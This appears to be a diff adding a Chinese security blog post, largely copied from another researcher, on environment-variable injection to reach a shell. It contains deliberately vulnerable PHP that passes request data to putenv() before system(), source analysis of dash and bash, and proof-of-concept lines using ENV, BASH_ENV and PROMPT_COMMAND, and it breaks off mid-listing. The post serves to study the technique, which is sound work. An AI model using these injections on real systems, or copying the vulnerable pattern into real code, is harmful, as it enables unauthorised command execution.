@@ -1,0 +1,1047 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" href="/img/head.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Epiphany">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="记录这篇文章的起因就是在NCTF中看到一个题，挺有意思的，然后看了题解，提到了P神的环境变量注入，想起来文章我看过，但是内容忘记了，于是打算重新学习一下。  本文大部分内容都来自P神博客，基本上都是抄写了该文章的一些内容，算一篇转载—&gt; https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;how-I-hack-bash-through-environment-inj">
+<meta property="og:type" content="article">
+<meta property="og:title" content="环境变量的一些奇特利用">
+<meta property="og:url" content="http://example.com/2022/12/12/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E7%89%B9%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Epiphany&#39;s blog">
+<meta property="og:description" content="记录这篇文章的起因就是在NCTF中看到一个题，挺有意思的，然后看了题解，提到了P神的环境变量注入，想起来文章我看过，但是内容忘记了，于是打算重新学习一下。  本文大部分内容都来自P神博客，基本上都是抄写了该文章的一些内容，算一篇转载—&gt; https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;how-I-hack-bash-through-environment-inj">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2022/02/21/7d54a730-6176-45b1-a998-ee1da4739096.png">
+<meta property="article:published_time" content="2022-12-12T11:33:21.000Z">
+<meta property="article:modified_time" content="2022-12-12T11:35:14.368Z">
+<meta property="article:author" content="Epiphany">
+<meta property="article:tag" content="环境变量注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.leavesongs.com/media/attachment/2022/02/21/7d54a730-6176-45b1-a998-ee1da4739096.png">
+  
+  
+  
+  <title>环境变量的一些奇特利用 - Epiphany&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/test.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😊","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"syTAHbVDGa0ZSug10p7Z9QM4-gzGzoHsz","app_key":"BDZY8j2r1l97VE3uLcsrU2Vd","server_url":"https://sytahbvd.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Epiphany&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/CTF">
+                    
+                    CTF
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/CVE">
+                    
+                    CVE
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/others">
+                    
+                    others
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/chats">
+                    
+                    chats
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.leavesongs.com/media/attachment/2022/02/21/7d54a730-6176-45b1-a998-ee1da4739096.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="环境变量的一些奇特利用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-12-12 19:33" pubdate>
+          星期一, 十二月 12日 2022, 7:33 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          86 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">环境变量的一些奇特利用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>记录这篇文章的起因就是在NCTF中看到一个题，挺有意思的，然后看了题解，提到了P神的环境变量注入，想起来文章我看过，但是内容忘记了，于是打算重新学习一下。</p>
+<blockquote>
+<p>本文大部分内容都来自P神博客，基本上都是抄写了该文章的一些内容，算一篇转载—&gt; <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>
+</blockquote>
+<p>文章中提到的内容主要是围绕以下代码:</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'envs'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+	<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span>=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$val</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span> 
+
+<span class="token comment">//... 一些其他代码 </span>
+
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>利用上段代码，如何getshell？看起来似乎是一件不可能的事情，但是实际上对环境变量的操作远远不止我们所理解的那么简单。</p>
+<h1>0x01 问题分析</h1>
+<p>环境变量基本的利用有一种，如果有上传文件的权限，那么就很自然的想到<code>LD_PRELOAD</code>，上传一个文件名不限的so文件，如<code>1.jpg</code>，然后通过设置动态链接库<code>LD_PRELOAD=/var/www/html/uploads/1.jpg</code>，劫持并执行任意代码。<br>
+但是在上面的代码中没有上传的地方，需要探索这个模式能不能getshell，则应该分析更底层的行为，php中system函数如下：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#define VCWD_POPEN(command, type) popen(command, type) // ...</span>
+<span class="token constant">PHPAPI</span> <span class="token keyword type-declaration">int</span> <span class="token function">php_exec</span><span class="token punctuation">(</span><span class="token keyword type-declaration">int</span> type<span class="token punctuation">,</span> char <span class="token operator">*</span>cmd<span class="token punctuation">,</span> zval <span class="token operator">*</span><span class="token keyword type-declaration">array</span><span class="token punctuation">,</span> zval <span class="token operator">*</span>return_value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+	<span class="token constant">FILE</span> <span class="token operator">*</span>fp<span class="token punctuation">;</span> 
+<span class="token comment">// ... </span>
+<span class="token comment">#ifdef PHP_WIN32 </span>
+	fp <span class="token operator">=</span> <span class="token function">VCWD_POPEN</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token comment">#else </span>
+	fp <span class="token operator">=</span> <span class="token function">VCWD_POPEN</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token comment">#endif </span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+		<span class="token function">php_error_docref</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">E_WARNING</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Unable to fork [%s]"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">goto</span> err<span class="token punctuation">;</span> 
+	<span class="token punctuation">&#125;</span> 
+<span class="token comment">// ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>可以看到php最终调用的是popen函数，popen函数是glibc提供的一个函数，查看其源码可以知道其最终调用如下：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> bool
+<span class="token function">spawn_process</span> <span class="token punctuation">(</span><span class="token class-name">posix_spawn_file_actions_t</span> <span class="token operator">*</span>fa<span class="token punctuation">,</span> FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">,</span>
+           <span class="token keyword">int</span> do_cloexec<span class="token punctuation">,</span> <span class="token keyword">int</span> pipe_fds<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> parent_end<span class="token punctuation">,</span> <span class="token keyword">int</span> child_end<span class="token punctuation">,</span>
+           <span class="token keyword">int</span> child_pipe_fd<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+
+  <span class="token comment">//...</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__posix_spawn</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_proc_file <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>pid<span class="token punctuation">,</span> _PATH_BSHELL<span class="token punctuation">,</span> fa<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
+             <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"-c"</span><span class="token punctuation">,</span>
+             <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> command<span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> __environ<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> false<span class="token punctuation">;</span>
+
+  <span class="token comment">//...</span>
+
+  <span class="token keyword">return</span> true<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>popen最终调用了<code>spawn_process</code>函数，然后其中最后执行的是<code>sh -c command</code>，如果说我输入了一个命令<code>echo hello</code>，那么最终调用的就是<code>sh -c &quot;echo hello&quot;</code>。</p>
+<p>转换以下上述问题，就是可以控制<code>sh -c &quot;echo hello&quot;</code>的环境变量，是否能够get shell？</p>
+<h1>0x02 对getshell的尝试</h1>
+<p>以上的命令可以从两个方面去分析，sh和echo，sh作为软连接指向bash或者dash（ubuntu为dash，centos为bash），echo作为一个二进制文件也可以分析，主要是抓住二者对环境变量的处理。</p>
+<h2 id="debian中的注入"><a class="header-anchor" href="#debian中的注入">¶</a>debian中的注入</h2>
+<p>先说ubuntu系统，系统中分析echo的源码，和环境变量有关的操作只有以下一个地方。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">bool allow_options <span class="token operator">=</span>
+  <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">getenv</span> <span class="token punctuation">(</span><span class="token string">"POSIXLY_CORRECT"</span><span class="token punctuation">)</span>
+   <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">!</span> DEFAULT_ECHO_TO_XPG <span class="token operator">&amp;&amp;</span> <span class="token number">1</span> <span class="token operator">&lt;</span> argc <span class="token operator">&amp;&amp;</span> <span class="token function">STREQ</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>而且是一个bool判断，没什么利用价值，关注点来到了dash。</p>
+<p>在dash的main函数中有一段代码：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>shinit <span class="token operator">=</span> <span class="token function">lookupvar</span><span class="token punctuation">(</span><span class="token string">"ENV"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>shinit <span class="token operator">!=</span> <span class="token char">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">read_profile</span><span class="token punctuation">(</span>shinit<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
+<p><code>looupvar</code>用于查找环境变量的值，这里相当于查找<code>ENV</code>这个环境变量然后传递给<code>read_profile</code>执行。继续跟进<code>read_profile</code>函数：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">STATIC <span class="token keyword">void</span>
+<span class="token function">read_profile</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    name <span class="token operator">=</span> <span class="token function">expandstr</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setinputfile</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> INPUT_PUSH_FILE <span class="token operator">|</span> INPUT_NOFILE_OK<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+
+    <span class="token function">cmdloop</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">popfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>函数本意是读取shell中的profile文件，类似于<code>$HOME/.profile</code>，但是可以看到，第一句话就对name做了一次<code>expandstr</code>操作，即为解析操作，解析的目的是为了支持shell语法，比如说把<code>$HOME</code>解析成绝对路径，既然有解析那么就可能有命令执行。</p>
+<p>尝试了如下poc</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">ENV</span><span class="token operator">=</span><span class="token string">'$(id 1>&amp;2)'</span> dash -c <span class="token string">'echo hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
+<p>但是发现没有回显，执行命令失败，进一步分析之后，发现一个问题：<br>
+<img src="https://www.leavesongs.com/media/attachment/2022/02/21/7d54a730-6176-45b1-a998-ee1da4739096.png" srcset="/img/loading.gif" lazyload alt=""><br>
+在进入目标语句之前有一个iflag变量，必须要这个变量满足，才可以进入到目标语句，而满足的条件是dash的参数有<code>-i</code>，再尝试以下poc：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">ENV</span><span class="token operator">=</span><span class="token string">'$(id 1>&amp;2)'</span> dash -i -c <span class="token string">'echo hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
+<p>成功执行<br>
+<img src="https://www.leavesongs.com/media/attachment/2022/02/21/de438649-abc0-4f8d-9b0c-b71cb0dd83c1.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>但是遗憾的是题目给出的条件是-c，并没有-i选项，所以这里的注入再限制条件中执行不了。<br>
+最后发现<code>PS1</code>、<code>PS2</code>、<code>PS4</code>这三个环境变量也是会被<code>expandstr</code>函数解析的，但是才疏学浅地我研究了一晚上PS4，发现它只能解析变量，无法执行命令，但我并没有弄明白原因：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2022/02/21/fdeb6053-22be-47e3-9025-0b0c51425c1d.png"><img src="https://www.leavesongs.com/media/attachment/2022/02/21/fdeb6053-22be-47e3-9025-0b0c51425c1d.a6e46564087f.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>PS1是很好触发的，但需要进入交互式shell中方可执行：</p>
+<p><img src="https://www.leavesongs.com/media/attachment/2022/02/21/1a3efd03-61cd-46c7-9a1b-636c40a9e5f8.27f2040d4bf3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="centos中的BASH-ENV"><a class="header-anchor" href="#centos中的BASH-ENV">¶</a>centos中的BASH_ENV</h2>
+<p>和之前的debian类似，很快就找到了一个BASH_ENV环境变量：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* A non-interactive shell not named `sh' and not in posix mode reads and
+     executes commands from $BASH_ENV.  If `su' starts a shell with `-c cmd'
+     and `-su' as the name of the shell, we want to read the startup files.
+     No other non-interactive shells read any startup files. */</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>interactive_shell <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>su_shell <span class="token operator">&amp;&amp;</span> login_shell<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>posixly_correct <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> act_like_sh <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> privileged_mode <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span>
+        sourced_env<span class="token operator">++</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">execute_env_file</span> <span class="token punctuation">(</span><span class="token function">get_string_value</span> <span class="token punctuation">(</span><span class="token string">"BASH_ENV"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>然后传入一个类似的poc：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">BASH_ENV</span><span class="token operator">=</span><span class="token string">'$(id 1>&amp;2)'</span> <span class="token function">bash</span> -c <span class="token string">'echo hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
+<p>直接执行成功<br>
+<img src="https://www.leavesongs.com/media/attachment/2022/02/21/53c5feca-33b8-49e7-87ee-6be315f3d5ee.png" srcset="/img/loading.gif" lazyload alt=""><br>
+但是遗憾的发现，sh注入失败，即</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">BASH_ENV</span><span class="token operator">=</span><span class="token string">'$(id 1>&amp;2)'</span> <span class="token function">sh</span> -c <span class="token string">'echo hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
+<p>执行失败，有点玄学，然后p神解释了原因，动态调试后可以发现有一个神奇的变量，<code>act_like_sh</code>，这个变量设置为1，导致以上语句没有执行。<br>
+当shell名字<code>shell_name</code>这个变量等于<code>sh</code>的时候，<code>act_like_sh</code>会变成1。这也就解释了我们前面反常的结果——为什么<code>bash -c</code>可以注入命令但<code>sh -c</code>不可以。</p>
+<p>虽然但是，依然不能够解决最初的问题，在只控制环境变量的条件下拿到shell，但是一些有趣的注入可以记录一下，<strong>dash可以的注入方式，bash都可以</strong>，此外bash还有一个有趣的环境变量：PROMPT_COMMAND，如果有这个环境变量，那么在最后进行交互模式之前，会先执行这个命令，但是如果有了-c参数，则这个指令会被忽略。<br>
+<code>PROMPT_COMMAND='id' bash</code></p>
+<h2 id="最终的注入"><a class="header-anchor" href="#最终的注入">¶</a>最终的注入</h2>
+<p>最终在centos上，还是解决了最开始提出的问题。<br>
+<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html#0x06-bash_env">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html#0x06-bash_env</a><br>
+懒得写了，可以看博客，非常清楚。<br>
+variables.c的<code>initialize_shell_variables</code>函数用于将环境变量注册成SHELL的变量，其中包含的一段代码引起了我的注意：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>string_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> env <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>string <span class="token operator">=</span> env<span class="token punctuation">[</span>string_index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    name <span class="token operator">=</span> string<span class="token punctuation">;</span>
+    <span class="token comment">// ...</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>privmode <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> read_but_dont_execute <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> 
+        <span class="token function">STREQN</span> <span class="token punctuation">(</span>BASHFUNC_PREFIX<span class="token punctuation">,</span> name<span class="token punctuation">,</span> BASHFUNC_PREFLEN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
+        <span class="token function">STREQ</span> <span class="token punctuation">(</span>BASHFUNC_SUFFIX<span class="token punctuation">,</span> name <span class="token operator">+</span> char_index <span class="token operator">-</span> BASHFUNC_SUFFLEN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
+        <span class="token function">STREQN</span> <span class="token punctuation">(</span><span class="token string">"() &#123;"</span><span class="token punctuation">,</span> string<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token class-name">size_t</span> namelen<span class="token punctuation">;</span>
+        <span class="token keyword">char</span> <span class="token operator">*</span>tname<span class="token punctuation">;</span>        <span class="token comment">/* desired imported function name */</span>
+
